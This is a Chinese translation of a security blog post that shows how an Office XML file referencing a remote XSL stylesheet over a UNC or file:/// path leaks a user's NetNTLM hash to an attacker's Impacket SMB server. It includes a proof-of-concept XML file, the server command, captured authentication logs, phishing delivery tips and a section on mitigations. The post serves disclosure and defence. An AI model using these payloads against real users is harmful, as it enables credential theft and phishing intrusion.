# 利用 Office XML 文档捕获 NetNTLM 哈希值

##### 译文声明
本文是翻译文章，原文作者为 bohops，发布于 bohops.com。译文仅供参考，具体内容和含义以原文为准。

## TL; DR
Office XML（.xml）文档可以通过 SMB 协议调用远程 XSL 样式表。如果该样式表位于攻击者控制的服务器上，则可获取用户的 net-NTLM 身份验证哈希值（质询/响应消息）。攻击者可以离线破解此哈希值，或利用其他技术进行远程命令执行（前提是用户权限足够且联网）。在安全性较差的目标环境中，这种技术还可以用于发动网络钓鱼攻击。XML 文档通常能够绕过大多数邮件网关过滤机制和其他网络安全控制。防御者可以考虑将默认的 XML 文件关联更改为文本编辑器，因为大多数用户不会需要打开原始 Office XML 文档。此外，强密码策略、严格的出网规则（例如禁止 SMB 出网流量）以及用户培训也可以帮助缓解此类攻击。

## 介绍
网上有许多方法可以捕获 netNTLM（版本1或版本2）质询/响应消息哈希值，并且有多种工具可用于利用或破解这些哈希值，如 CoreSecurity 的 [Impacket](https://github.com/CoreSecurity/impacket)、Laurent Gaffie 的 [Responder](https://github.com/SpiderLabs/Responder)、[@kevin_robertson](https://github.com/Kevin-Robertson) 的 [Inveigh](https://github.com/Kevin-Robertson/Inveigh) 以及 Jens Steube 的 [Hashcat](https://github.com/hashcat/hashcat)。这些捕获技术通常归类为后渗透技术，通常需要主机联网或访问主机才能成功。在适当情况下，这些技术可以通过用户驱动的方式（例如通过 Microsoft Office 文档）实施，从而成为攻击者登录用户主机的切入点。本文将讨论一种非常规的技术：使用 Microsoft Office（Word）2016 进行 UNC 路径重定向并捕获 netNTLM。内容包括：
- Microsoft XML 文档的基本介绍
- 通过操作 XML 样式表捕获 NetNTLM
- 用例、注释和警告
- 如何防范此类攻击

**注意**：在继续阅读之前，建议您查看以下资源，以了解有关 Windows 身份验证协议和相关捕获方法的信息：
- @petergombos 的 [LM, NTLM, Net-NTLMv2, oh my!](https://medium.com/p/a9b235c58ed4)
- @netbiosX 的 [Microsoft Office – NTLM Hashes via Frameset](https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/)
- @mubix 的 [SMB/HTTP Auth Capture via SCF File](https://room362.com/post/2016/smb-http-auth-capture-via-scf/)
- @osandamalith 的 [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
- @thomas_elling 的 [Microsoft Word – UNC Path Injection with Image Linking](https://blog.netspi.com/microsoft-word-unc-path-injection-image-linking/)

## Microsoft XML 文档的基本介绍
从 Office 2007 开始，大多数文档格式都基于微软的 Office Open XML (OOXML)，这是一种由微软开发的基于 XML 的压缩文件格式，用于表示电子表格、图表、演示文稿和文字处理文档（[维基百科](https://en.wikipedia.org/wiki/Office_Open_XML)）。这可以从较新的扩展名中看出，例如 Microsoft Word 的 .docx 和 Excel 的 .xlsx。

有趣的是，Office 文档也可以被视为包含有效标记和属性的“扁平”XML 文件。例如，让我们在 MS Word 2016 中添加一些文本，创建一个传统的 Word XML 文档：

1. 将文件保存为 XML 格式，而不是 .docx。
2. 以下是该文档的部分 XML 表示：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml">
    <w:body>
        <w:p>
            <w:r>
                <w:t>Hello, World!</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:wordDocument>
```

有趣的是，有一个包含 `mso-application` 标签的标签：

```xml
<o:DocumentProperties xmlns:o="urn:schemas-microsoft-com:office:office">
    <o:Application>WinWord</o:Application>
    <o:DocSecurity>0</o:DocSecurity>
    <o:Version>16.0000</o:Version>
</o:DocumentProperties>
<m:appPr xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math">
    <m:docVars>
        <m:docVar name="ProgID" val="Word.Document.12"/>
    </m:docVars>
</m:appPr>
```

`ProgID` 实际上是一个 COM 标识符。Microsoft XML Handler (MSOXMLED.EXE) 会处理 `mso-application` 标记以加载由 `ProgID` 标识的相应 Office 应用程序。可以直接调用 MSOXMLED.EXE 来启动相应的 XML 文件：

```sh
MSOXMLED.EXE /verb open "C:\Users\user\Desktop\word.xml"
```

或者，用户可以直接启动 XML 文件（在资源管理器中），并交由文件默认关联的处理程序来处理。如果未设置默认文件关联（Windows 10 默认未设置），资源管理器将调用 runonce.exe，由用户选择 Office 程序。Office XML Handler 是第一个（也是首选）选项，一旦选中，Office XML Handler 将成为 XML 文件的默认处理程序。

Office XML Handler 会调用 Word (winword.exe) 来打开文档。

*注意：还有其他方式，例如从 Word 中打开 XML 文件或直接使用命令行。这些方法会“绕过”关联的处理程序。

## 通过操作 XML 样式表捕获 NetNTLM
从 Christian Nagel 2004 年发表的 [文章](http://weblogs.thinktecture.com/cnagel/xml/) 中，我提取了一个简单的 Word XML 文档和样式表，并进行了修改作为此攻击方式的 PoC。以下是修改后的本地 XML 文件（引用了一个远程服务器的 XSL 文件）：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?xml-stylesheet type="text/xsl" href="\\192.168.245.175\test\word.xsl"?>
<w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml">
    <w:body>
        <w:p>
            <w:r>
                <w:t>Hello, World!</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:wordDocument>
<m:appPr xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math">
    <m:docVars>
        <m:docVar name="ProgID" val="Word.Document.12"/>
    </m:docVars>
</m:appPr>
```

此 XML 文件的 `xml-stylesheet` 标签包含对远程位置的引用（`href`）。此外，我们添加了 `mso-application` 标签，以确保处理程序会将 XML 文档交由适当的应用程序处理。

在尝试打开此文件之前，让我们在攻击计算机上启动 Impacket SMB 服务器：

```sh
smbserver.py -smb2support test .
```

双击我们的“恶意”XML 文件，打开它：

现在，检查我们的 SMB 服务器日志以确认结果：

```
[*] Incoming connection (192.168.245.175,51491)
[*] AUTHENTICATE_MESSAGE (User: user, Domain: WORKGROUP, Server: TEST, Workstation: WIN10)
[*] User user authenticated successfully
```

成功了。我们现在可以尝试破解这个哈希！

## 用例、注释和注意事项

### 网络钓鱼的影响
根据具体情况，XML 文件可以通过某种网络钓鱼技术来部署。如果目标组织对远程用户的出网过滤规则或 VPN 控制较弱，攻击者可以将 Office XML 文档作为电子邮件附件发送给受害者，邮件很可能绕过邮件网关和扫描雷达到达对方的收件箱：

双击并按“打开”。

*注意：根据具体情况，用户可能必须逐步点击默认关联的提示框。

因为该文件来自其他位置（例如 Web），Word 会在 [受保护视图](https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653) 中打开。一旦我们“启用编辑”，就会从远程服务器获取 XSL 文档，于是我们就可以在攻击机上收集用户的 NetNTLM 哈希值。

### 样式表参考标记
在上面的示例中，我们使用显式 UNC 路径来引用样式表。使用 `file:///` 协议也可以：

```xml
<?xml-stylesheet type="text/xsl" href="file:///192.168.245.175/test/word.xsl"?>
```

### 其他 Microsoft Office 应用程序
这种远程加载样式表的方式也适用于其他 Office 应用程序（例如 Excel）。Word 似乎是最简单的。

### WebDAV
Microsoft Word 支持 WebDAV 协议。如果 Word 无法通过 SMB 协议获取远程样式表，Word 将尝试使用 HTTP WebDAV 请求获取远程文件。Didier Stevens (@DidierStevens) 在这篇文章中详细描述了这种行为——[Webdav Traffic to Malicious-Sites](https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/)。

*注意：如果使用 NTLM WebDAV 进行身份验证失败，服务器通常会返回 401（表示操作未经授权）。不同的 WebDAV 客户端对此问题的处理方式不同。Explorer.exe 会提示用户输入凭据，而 Word 似乎会在没有弹出窗口的情况下多次请求资源。这种行为非常有趣，但我无法强制传递 NTLM 请求到服务器。此课题将在以后进一步研究。

## 如何防范此类攻击
- **强密码策略**：使用唯一的强密码，最大限度地减少攻击者破解收集到的 NetNTLM 哈希值的机会。
- **文件关联**：除非确实有业务需求，否则请考虑将 XML 文件的默认关联程序更改为文本编辑器。此微软官方 [文档](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754587) 提供了使用 GPO/GPP 配置“文件类型首选项”的指南。
- **出网规则**：出网流量，尤其是 SMB（TCP 139/445）对任何组织（或家庭）都是危险的。强制执行出网防火墙规则，并仅开放实际需要的端口。
- **（远程）用户**：使用 Webmail 或 VPN 但不通过隧道传输所有流量的远程用户可能面临此类攻击（以及其他类似攻击）的威胁。如果可能，尝试收紧远程访问控制策略，并通过 VPN 隧道传输流量。最重要的是，训练用户在打开邮件附件时务必小心谨慎。

## 结论
感谢您抽出宝贵时间阅读这篇文章！与往常一样，如果您有任何问题或反馈，请随时给我发消息。

– @bohops